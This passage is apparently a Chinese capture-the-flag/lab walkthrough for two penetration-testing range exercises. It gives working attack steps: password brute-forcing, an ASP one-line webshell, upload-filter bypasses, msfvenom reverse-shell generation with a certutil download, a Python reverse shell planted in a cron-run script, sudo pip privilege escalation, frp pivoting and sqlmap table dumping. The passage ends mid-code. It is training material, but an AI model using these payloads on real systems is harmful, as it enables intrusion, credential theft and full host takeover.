src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/bf2d2bad5a59405fbf8b56dcebf1eab3.png" alt="img"></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/be1a1ae6c051401bbb368c37777bd4b8.png" alt="img"></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/afdffd2c92104aca81b86847773f07f8.png" alt="img"></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/0b681917585542ca909d3806ddaf6612.png" alt="img"></p><p>此时抓包工具已开启拦截：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/dadad35442414f49b33d6f35b2d07dc9.png" alt="img"></p><p>回到浏览器中，输入登录信息：<code>admin/admin</code>：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/54a30f6b1f874e6085b04f24b98e89a6.png" alt="img"><br>点击<code>LOGIN</code>：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/e8204db8ab0f43fcbeb3d2e85f3ee3db.png" alt="img"></p><p>此时抓包工具出现记录，通过点击<code>Forward</code>按钮可查看下一个包：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/ef6ef3768b0240b7ad06df4bcba3794e.png" alt="img"></p><p>找到包含登录信息的数据包：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/1fbd2c8ebf414e898a6891602a8b66b6.png" alt="img"></p><p>将数据包发送到攻击模块，尝试暴力破解<code>admin</code>用户的密码，点击<code>Action</code>&gt;&gt;<code>Send to Intruder</code>：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/ab607222035c4fc98595d95f43e93411.png" alt="img"></p><p>点击<code>Intruder</code>&gt;&gt;<code>Positions</code>，点击<code>Clear</code>：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/e2b4c6c3bdce4148ab1109f6e12d71e1.png" alt="img"></p><p>双击选中<code>password=</code>后面的<code>admin</code>：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/8a7b462d0f9c4b7b92de0ca4a362a9ff.png" alt="img"></p><p>选中后点击<code>Add</code>，准备爆破密码信息：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/9ab0cc58551e482c9f92569d11c75ee0.png" alt="img"></p><p>点击<code>Payloads</code>&gt;&gt;<code>Load...</code>：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/de8d461b3c07405eb95b7bae1569722f.png" alt="img"></p><p>添加密码字典：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/7a95ebf6f63f4c77bbaf45cf99da453c.png" alt="img"></p><p>配置完成后点击<code>Start attack</code>进行暴力破解：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/a8b426c4a38d4333b35e828f9d7059f1.png" alt="img"></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/b5394b182f3043589e99de7f3a8609b3.png" alt="img"></p><p>破解结果显示<code>test123</code>的响应长度不一样，在<code>Response</code>中发现网站主页的链接，确定<code>test123</code>为登录密码：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/ac687269b256485cb363a51080cf4c72.png" alt="img"></p><h4 id="任务3-文件上传获取Shell"><a href="#任务3-文件上传获取Shell" class="headerlink" title="任务3: 文件上传获取Shell"></a>任务3: 文件上传获取Shell</h4><p>题解:<br>抓包工具关闭监听，点击<code>Intercept is on</code>按钮：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/c1070454b5804e799cb02c1a8c6bbaab.png" alt="img"></p><p>浏览器中使用爆破得到的密码进行登录：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/357a0770518e4fcb905ad8b69f8e39af.png" alt="img"></p><p>发现报错500：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/862c47bf988c4df68eaf2fe62bca1b66.png" alt="img"></p><p>通过对源码的检查，发现文件上传界面：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/3bb797ce2585468781ae65636d21910a.png" alt="img"></p><p>浏览器中尝试访问：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/6a94cb0ee7414537ba590ff423969e25.png" alt="img"></p><p>在桌面创建文件，命名为<code>1.asp</code>：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/867d50e44243407f8e680e259f414195.png" alt="img"></p><p>修改<code>1.asp</code>文件的内容为一句话木马：</p><pre><code class="gcode">&lt;%execute request(&quot;cmd&quot;)%&gt;</code></pre><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/c5acc676f5c7423082314e416bc84fa3.png" alt="img"></p><p>上传<code>1.asp</code>：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/530aa8c4f12c497693b43e4028b501ef.png" alt="img"></p><p>跳转到后<code>HOME</code>界面：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/e104e6c14b374bbfa6fb8bd8426e07c8.png" alt="img"></p><p>将<code>1.asp</code>重命名为<code>1.cer</code>：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/76543a2264dc43d28c26aa5c0b41067d.png" alt="img"></p><p>将<code>1.cer</code>进行上传：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/d4cee0f4a11d461e99287504dbdec832.png" alt="img"></p><p>上传成功：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/d667c169ba0e4c0cb3e4b50882589658.png" alt="img"></p><h4 id="任务4-获取管理员权限"><a href="#任务4-获取管理员权限" class="headerlink" title="任务4: 获取管理员权限"></a>任务4: 获取管理员权限</h4><p>题解:<br>在<code>Kali_MissionKit</code>操作机中进入<code>/root/Desktop/tools/antsword/AntSword-Loader-v4.0.3-linux-x64/</code>目录，在该目录下右键打开终端：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/7fae3e83d5d6488daf4ce7148496b308.png" alt="img"></p><p>启动蚁剑：</p><pre><code class="jboss-cli">./AntSword</code></pre><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/0990e02bcba64ad0a0b33b353c448943.png" alt="img"></p><p>右键空白处点击<code>Add</code>，shell信息如下，点击<code>Add</code>进行添加：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/b57a41161e7c4d6393ac7c75d4dccc70.png" alt="img"></p><p>双击添加的<code>shell url</code>进入文件目录，将桌面的<code>ms15-051x64.exe</code>文件通过拖拽的方式上传至蚁剑工具：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/fc69ca896551403086aae8491e05d887.png" alt="img"></p><p>蚁剑中在<code>ms15-051x64.exe</code>文件所在目录下右键打开终端：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/982a122124b24bb38a4583677566ce2b.png" alt="img"></p><p>执行命令查看权限：</p><pre><code class="apache">ms15-051x64.exe &quot;whoami&quot;</code></pre><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/15b1e7fb6288432ba3f4382bb79420eb.png" alt="img"></p><p>获取到<code>system</code>权限。</p><h2 id="阶段2-站点数据库渗透控制"><a href="#阶段2-站点数据库渗透控制" class="headerlink" title="阶段2: 站点数据库渗透控制"></a>阶段2: 站点数据库渗透控制</h2><h4 id="任务1-数据库SQL注入获取Shell"><a href="#任务1-数据库SQL注入获取Shell" class="headerlink" title="任务1: 数据库SQL注入获取Shell"></a>任务1: 数据库SQL注入获取Shell</h4><p>题解:<br>继续检查门户网站的文件结构，发现<code>acms_pageedit.asp</code>页面：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/6a3f82d56667463c929a97600c4aa3f1.png" alt="img"></p><p>浏览器中进行访问：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/64e6ec285d9d4316a2e9b73212a842f8.png" alt="img"></p><p>点击<code>Content Management</code>&gt;&gt;<code>Pages</code>：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/cc2a9f32628f402183f8368e718e036a.png" alt="img"></p><p>点击<code>HOME</code>：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/f845045fcc9e4bc9940cf3d5591f9b3c.png" alt="img"></p><p>抓包工具启动抓包，点击<code>Intercept is off</code>按钮：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/a37551b32f92482aa3718d02b9f2e907.png" alt="img"></p><p>浏览器中点击<code>UPDATE</code>按钮，抓包工具中出现记录：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/99143e187bcd493ab5be5ce33de0cae4.png" alt="img"></p><p>全选包信息另存为<code>1.txt</code>，将<code>1.txt</code>放在桌面：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/2f35338ad7954586b5bf711de044b806.png" alt="img"></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/94a102c73cde4339bc4590bede2c10e6.png" alt="img"></p><p>此时我们创建http服务，将<code>1.txt</code>发布到<code>Win10_MissionKit</code>操作机中；在<code>Kali_MissionKit</code>操作机的桌面右键打开终端执行命令：</p><pre><code class="apache">python -m SimpleHTTPServer 800</code></pre><p>登录<code>Win10_MissionKit</code>操作机，打开浏览器访问：</p><pre><code class="awk">http://66.66.66.6:800</code></pre><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/00c411294b5e4eca9eab5db357061492.png" alt="img"></p><p>点击<code>1.txt</code>出现文本的内容：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/0e0d337e9837448e815bba59bbfc5f30.png" alt="img"></p><p>打开SQL注入工具，检查站点是否存在注入点：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/ec9b052a463c4a90becee7a9f57bc5ef.png" alt="img"></p><p>双击exe程序：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/a5fc9c0c246b4d9d9dadfb2ca2719cca.png" alt="img"></p><p>将<code>1.txt</code>的内容复制到请求栏中，修改IP地址，完成后点击<code>识别注入</code>：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/06e926ec7fae41b28a54edc4d1b95388.png" alt="img"></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/6c536946862f4781a0a2318c984f7aea.png" alt="img"></p><p>日志出现注入测试完成后可查看注入记录：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/2b3939e9835244afa04a945d3b9266d4.png" alt="img"></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/25869567b93945688eaf62fbf8841750.png" alt="img"></p><p>发现注入点后执行命令：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/4c544dde248c4c2c89bdaaf18d897521.png" alt="img"></p><p>输入命令后点击<code>执行</code>，日志栏出现提示，若无提示请再次点击：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/ffe63bb9982f4f6d8075b420c90f2ba5.png" alt="img"></p><p>获取到主机的命令执行权限。</p><h4 id="任务2-建立连接获取管理员权限"><a href="#任务2-建立连接获取管理员权限" class="headerlink" title="任务2: 建立连接获取管理员权限"></a>任务2: 建立连接获取管理员权限</h4><p>题解:<br>在<code>Kali_MissionKit</code>操作机中，在桌面右键打开终端，我们用<code>msfvenom</code>生成一个可执行后门：</p><pre><code class="routeros">msfvenom -p windows/meterpreter/reverse_tcp lhost=66.66.66.6 lport=6666 -f exe -o shell.exe</code></pre><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/e4bda546481e44528e7d3238d21a211d.png" alt="img"></p><p>回到<code>Win10_MissionKit</code>操作机，在SQL注入工具中执行命令：</p><pre><code class="livecodeserver">certutil -urlcache -split -f http://66.66.66.6:800/shell.exe</code></pre><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/c7ef44b1fd024f9e8fe491f8e5857260.png" alt="img"></p><p>在<code>Kali_MissionKit</code>操作机中的终端启动MSF：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/0d2ef1b3f8164e38b07d0221945edcce.png" alt="img"></p><p>执行命令开启监听：</p><pre><code class="routeros">use exploit/multi/handlerset lhost 66.66.66.6set lport 6666set payload windows/meterpreter/reverse_tcprun</code></pre><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/9775034113f74dc1a33596f94b5897b7.png" alt="img"></p><p>回到<code>Win10_MissionKit</code>操作机，在SQL注入工具中执行命令：</p><pre><code class="vim">shell.exe</code></pre><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/d9704243f4d7443cb7abf044c16e879a.png" alt="img"></p><p>执行完成后回到<code>Kali_MissionKit</code>操作机，获取到<code>meterpreter</code>会话，查会话的主机地址：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/a5ed506d961a4e80a078729af6d79a33.png" alt="img"></p><p>使用<code>getsystem</code>命令进行提权，获取到<code>system</code>权限：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/014f799cb05f444aa9176ef7da5474eb.png" alt="img"></p><h1 id="测试2"><a href="#测试2" class="headerlink" title="测试2"></a>测试2</h1><p>详情 - 标准资源_CPIT0000002-CMS内网渗透基础演练</p><h2 id="阶段1-Wakanda主机渗透"><a href="#阶段1-Wakanda主机渗透" class="headerlink" title="阶段1: Wakanda主机渗透"></a>阶段1: Wakanda主机渗透</h2><h4 id="任务1-文件包含漏洞获取权限"><a href="#任务1-文件包含漏洞获取权限" class="headerlink" title="任务1: 文件包含漏洞获取权限"></a>任务1: 文件包含漏洞获取权限</h4><p>题解:<br>Win10主机访问192.168.1.7</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/cb832a9cf40440df93e85a379d786ce3.png" alt="img"></p><p>查看页面源代码</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/3f5f1839eccb4ae0bb58a37f2554e1e9.png" alt="img"></p><p>看起来很像文件包含。</p><p>测试读取一下代码。</p><pre><code class="awk">http://192.168.1.7/?lang=php://filter/read/convert.base64-encode/resource=index</code></pre><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/0a26d147b524483fb0636e3529e139c3.png" alt="img"></p><p>将源码复制到输入框中：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/afb7c8ac325f456a87c84f5e03ff9eff.png" alt="img"></p><p>全选后进行base64解码：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/e30325f697d24b6584c316240df241bd.png" alt="img"></p><p>将解码后的内容复制粘贴到文本文档中，打开后发现一个用户名和密码。</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/7541f74cdf0e45b690a08a62682a8250.png" alt="img"></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/ac681c82afdb4febb471804d5d4edcf1.png" alt="img"></p><pre><code class="erlang-repl">mamadouNiamey4Ever227!!!</code></pre><p>kali主机中使用Nmap对wakanda机器扫描全端口,命令 <code>nmap -sT -Pn 192.168.1.7</code></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/2cdab507159b4364949e22eb37405e2f.png" alt="img"></p><p>找到了端口尝试去登陆。</p><p>成功登陆，登陆之后发现是一个python。</p><pre><code class="erlang-repl">ssh mamadou@192.168.1.7 -p 3333yesNiamey4Ever227!!!</code></pre><p>使用pty<br><code>import pty;pty.spawn(&quot;/bin/bash&quot;)</code><br>构造一个交互shell</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/de7c8971db9f4009b46741df650124ef.png" alt="img"></p><p>成功读取第一个flag</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/e043dd2043204a98ba635fcfe8f2e630.png" alt="img"></p><h4 id="任务2-构建反弹Shell打印Flag"><a href="#任务2-构建反弹Shell打印Flag" class="headerlink" title="任务2: 构建反弹Shell打印Flag"></a>任务2: 构建反弹Shell打印Flag</h4><p>题解:<br>读取<code>etc/passwd</code></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/9ab8d71dcf144ca0a43f276c3a1664bf.png" alt="img"></p><p>发现有一个账户devops</p><p>进入到该目录下</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/ce3af1454c79466989854b5341848462.png" alt="img"></p><p>发现flag无法读取</p><p>此时读取一下devops用户的其他文件，查看一下第一个文件，发现 .antivirus.py文件可以写</p><p>find &#x2F; -user devops 2&gt;&#x2F;dev&#x2F;null</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/e8fb3597842d474db9960ebcc17c7cda.png" alt="img"></p><p>查看.antivirus.py文件，只有一行内容，即向&#x2F;tmp&#x2F;test中写入一行</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/1f74775ed6b64dac989f2f0ee415eecb.png" alt="img"></p><p>仔细观察后发现，test文件每分钟就会被修改一次，说明有一个定时任务在不断调用.antivirus.py</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/602777f9453a4756b865abb1590405c0.png" alt="img"></p><p>于是尝试将.antivirus.py的内容修改为如下内容：</p><pre><code class="stylus">f=open(&#39;/home/devops/flag2.txt&#39;, &#39;r&#39;).read()open(&#39;/tmp/flag.txt&#39;,&#39;w&#39;).write(f)</code></pre><p>几分钟后查看tmp目录，果然出现了flag.txt，读取便获得了第二个flag</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/3f1a91c34db441b9a288f4f7f8d2dd23.png" alt="img"></p><p>构造python反向shell，代码如下，写入到.antivirus.py文件中（编辑文件命令：vim &#x2F;srv&#x2F;.antivirus.py）。</p><pre><code class="stylus">open(&#39;/tmp/test&#39;,&#39;w&#39;).write(&#39;test&#39;)import socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;99.99.99.99&quot;,1235))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])</code></pre><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/b2efc1ad11c24f9695de966f74f69d44.png" alt="img"></p><p>本机监听，等待执行 成功反弹，读取flag</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/e202e6e19f44414da091d660982a265b.png" alt="img"></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/37240c3c63914f2b9733908154537f0f.png" alt="img"></p><h4 id="任务3-目标提权获取root权限"><a href="#任务3-目标提权获取root权限" class="headerlink" title="任务3: 目标提权获取root权限"></a>任务3: 目标提权获取root权限</h4><p>题解:<br>信息收集：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/e66b850a488e44baaa6388c17aba4b79.png" alt="img"></p><p>执行sudo –l</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/d624ba01364a49708eba669758e99b5a.png" alt="img"></p><p>看到有一个pip是无需密码即可执行，且root权限</p><p>此处需要用到一个py脚本，kali操作机已经提供了，在kali的Desktop目录下</p><p>kali操作机使用python打开http服务，访问kali操作机的http服务下载py脚本提权。</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/14107f17230148f1a7c0fd2eae302bd8.png" alt="img"></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/38afd6d619a84407bf9456c2b6d4bf34.png" alt="img"></p><p>编辑<code>setup.py</code>,设置成kali的ip地址</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/2e026066a6e0480b9e7c4aa4985c129e.png" alt="img"></p><p>在kali操作机种使用nc 监听 13372 端口，然后直接在定时计划任务反弹的shell执行以下指令<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/89294607a745407c941ad71d7fee4a41.png" alt="img"></p><p>回到devops的shell执行命令：</p><pre><code class="jboss-cli">sudo /usr/bin/pip install  . --upgrade --force-reinstall</code></pre><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/24f5fb3bf4474546a600fbbdd443deee.png" alt="img"></p><p>nc反弹成功，root权限：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/aa0e6b6ca0eb4622a16d477298936d6a.png" alt="img"></p><p>看到<code>root.txt</code>的内容，得到Flag。</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/d7d0f3776153409fb9a4adc1e65fe196.png" alt="img"></p><h2 id="阶段2-内网博客站点渗透"><a href="#阶段2-内网博客站点渗透" class="headerlink" title="阶段2: 内网博客站点渗透"></a>阶段2: 内网博客站点渗透</h2><h4 id="任务1-扫描内网建立跳板"><a href="#任务1-扫描内网建立跳板" class="headerlink" title="任务1: 扫描内网建立跳板"></a>任务1: 扫描内网建立跳板</h4><p>题解:<br>在root权限的shell中上传frp代理工具：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/e8d141d2bcf04b2880ac3d7b254c1f7e.png" alt="img"></p><p>在<code>/root/Desktop/tools/frp/</code>目录下打开终端，执行命令：</p><pre><code class="awk">chmod +x frps  //赋权./frps -c ./frps.ini   //建立代理服务端</code></pre><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/632e4454f3074beaaa5b853c17c97f91.png" alt="img"></p><p>在root权限的shell中执行命令：</p><pre><code class="awk">chmod +x frpc  //赋权./frpc -c ./frpc.ini   //连接服务端</code></pre><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/e232c90653c14a308012151e0c33a6c8.png" alt="img"></p><p>代理建立成功：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/3c2b95114cca4dc1aef75dfeb63a4779.png" alt="img"></p><p>连接成功后设置proxychains的配置文件：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/dbbc86d1651f4a8c89558646428266ac.png" alt="img"></p><p>新增记录：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/d7ed95be37d8412ba1702aa16dd3283d.png" alt="img"></p><p>内网探测：进入<code>/root/Desktop/tools/PortScan/</code>目录，在该目录下打开终端，使用代理扫描内网前十个IP地址：</p><pre><code class="apache">proxychains python scan.py 192.168.1.1 192.168.1.10 -t 20</code></pre><p>扫描完成后会在<code>/root/Desktop/tools/PortScan/</code>目录下生成日志文件log.txt，双击查看：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/4f9e9285a9aa4d928d590d9f96450c6b.png" alt="img"></p><p>注：若扫描长时间为结束请检查是否存在卡顿现象，检查代理报文是否一直更新，访问内网其他主机的80端口判断代理是否正常，若异常请先重启代理服务端，再重启代理客户端；若代理正常请再次运行命令执行扫描。</p><p>发现存在主机开放80端口。</p><p>登录Win10侦察终端，打开代理软件：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/3c40947264fd41138272ea825a6e2660.png" alt="img"></p><p>双击任务栏出现的图标：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/6241c779a5664d63b52e778a8253ccff.png" alt="img"></p><p>建立代理服务器：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/81cd05a9188842e58e7fae9920cd09d2.png" alt="img"></p><p>添加记录：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/fb5c1fbed8a34767b0a753e96b8f2b28.png" alt="img"></p><p>配置信息如下：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/7aae99ddf16944919e80dafda4bc34e3.png" alt="img"></p><p>点击Yes&gt;&gt;OK&gt;&gt;OK完成配置。</p><h4 id="任务2-SQL注入读取用户密码"><a href="#任务2-SQL注入读取用户密码" class="headerlink" title="任务2: SQL注入读取用户密码"></a>任务2: SQL注入读取用户密码</h4><p>题解:<br>使用Firefox浏览器，输入IP地址<code>192.168.1.8</code>，打开该网站。</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/5ca75814514d41f0a3244561a34fbebe.png" alt="img"></p><p>看到该网站的主页有个<code>test</code>选项，点击 <code>test</code>发现跳转到cat.php页面。</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/211cc6a2018b48f1ae9fc8fc8051b1b8.png" alt="img"></p><p>判断当前页面可能存在注入，对其进行测试，在参数 <code>id=1</code>的后面加 <code>单引号</code>，页面报错存在注入。</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/1cc908f33bdc45069a299e32db987047.png" alt="img"></p><p>但是错误跟平时的似乎不太一样。显示为pg_exec()查询失败。所以可以大致推断，这是一个Postgre数据库的SQL注入，我们使用sqlmap 进行自动化sql注入测试。</p><p>探测目标网站的数据库数量，切换到Kali侦察终端，在命令终端中执行 <code>proxychains sqlmap -u http://192.168.1.8/cat.php?id=1 --dbs</code>（过程出现提示一律输入y）<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/4b82e2268f4c4455bd44e9757dab671b.png" alt="img"></p><p>探测public数据库中有哪些表 <code>proxychains sqlmap -u http://192.168.1.8/cat.php?id=1 -D public --tables</code></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/eaf9756f2a4d4828a1bd1d8934f9dcb8.png" alt="img"></p><p>探测 public数据中users表的信息 <code>proxychains sqlmap -u http://192.168.1.8/cat.php?id=1 -D public -T users --dump</code>（过程出现根据提示输入y或回车）</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/5663c08e43554a6ea727457ca6bc270c.png" alt="img"></p><h4 id="任务3-上传Webshell获取连接"><a href="#任务3-上传Webshell获取连接" class="headerlink" title="任务3: 上传Webshell获取连接"></a>任务3: 上传Webshell获取连接</h4><p>题解:<br>回到Win10侦察终端，我们在网站的页面点击 <code>admin</code>，跳转到网站的后台登录页面，输入我们通过sql注入获取到user表中对应的用户和密码。<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/b5495c4ecf6546b8b18bdd67f5e2d90e.png" alt="img"></p><p>发现后台存在文件上传的地方，我们进行文件上传测试.<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/32f92abb6cc24ef29baba37ee298c787.png" alt="img"></p><p>点击browse ，选择桌面上1.php文件进行上传，然后点击 add 添加<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/2e5f86d4a2a747cf9a0b90c09246eceb.png" alt="img"></p><p>发现上传php文件之后，出现了 NO php 的提示，此时说明php文件不能上传。<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/4a4cd362e7bd4732bf5ddd473a024a37.png" alt="img"></p><p>先尝试上传.htacess文件，如果AllowOverride是默认值，即ALL，那么就可以通过.htaccess文件来将其他扩展名的文件作为PHP文件来解析。</p><p>首先在桌面创建一个名为htaccess的文件，内容为：</p><pre><code class="applescript">AddType application/x-httpd-php 